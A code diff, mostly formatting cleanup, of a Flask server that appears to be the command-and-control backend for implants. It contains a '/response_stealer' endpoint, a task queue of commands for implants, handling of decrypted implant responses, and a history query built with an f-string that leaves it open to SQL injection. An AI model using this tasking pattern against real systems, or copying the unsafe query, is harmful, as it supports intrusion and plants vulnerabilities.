@@ -275,6 +275,7 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
+
 @app.route("/response_stealer", methods=["POST"])
 @cross_origin()
 def handle_response_stealer():
@@ -299,8 +300,8 @@ def getsymkey():
         data = request.get_json(force=True)
         print()
         print("response:")
-        data= data['data']
-        
+        data = data['data']
+
         RsaDecryption.decrypt(data)
         response_data = data['response_data']
         success = data['success']
@@ -310,16 +311,17 @@ def getsymkey():
         # DUMP BACK INTO TASK_QUEUE
 
         if success in ["success", "Success"]:
-            success = True  
-        else: 
+            success = True
+        else:
             success = False
 
         query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
-        if query ==[]:
+        if query == []:
             print("\n\nupdate task queue worked\n\n")
         time = datetime.now()
         print(response_data, success, time, task_id)
-        response = tools.executeGenericVar(query, [response_data, success, time, task_id])
+        response = tools.executeGenericVar(
+            query, [response_data, success, time, task_id])
         print(response)
         return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
 
@@ -331,7 +333,7 @@ def getsymkey():
         return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-#Implant response endpoint, in json
+# Implant response endpoint, in json
 # Implant response endpoint, in json
 
 # Addisons Worktime -
@@ -342,13 +344,13 @@ def getsymkey():
 @cross_origin()
 def handle_response_data():
     print("Received response")
-    if(request.content_length<5000000):
-        try:    
-            x=request.get_data()
-            data=request.data
+    if (request.content_length < 5000000):
+        try:
+            x = request.get_data()
+            data = request.data
             print(request.data)
             print(x)
-            data=RsaDecryption.rsadecrypt(data)
+            data = RsaDecryption.rsadecrypt(data)
             print(data)
             print("response:")
             print(data)
@@ -482,6 +484,8 @@ def testThis():
         return error, 401, {'Access-Control-Allow-Origin': '*'}
 
 # Gets log history of a particular implant, for console
+
+
 @app.route("/get_history", methods=["POST"])
 def get_history():
     try:
@@ -496,23 +500,15 @@ def get_history():
             f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
         combined = [{"sender": "user", "creator": x[-1],
                      "time":x[3], "command":x[2]} for x in executing]
-       
         combined += [{"sender": "implant", "time": x[-2],
                       "command":x[2], "response":x[-4]} for x in executing]
-       
         combined += [{"sender": "user", "creator": x[-1],
                      "time":x[3], "command":x[2]} for x in executed]
-        print(combined)
         combined += [{"sender": "implant", "time": x[-2],
                       "command":x[2], "response":x[-4]} for x in executed]
-
-       
         combined += [{"sender": "user", "creator": x[-1],
                       "time":x[3], "command":x[2]} for x in pending]
-
-        
         sortedList = sorted(combined, key=lambda x: x['time'])
-       
 
         return {"sorted": sortedList}, 200, {'Access-Control-Allow-Origin': '*'}
     except Exception as e:
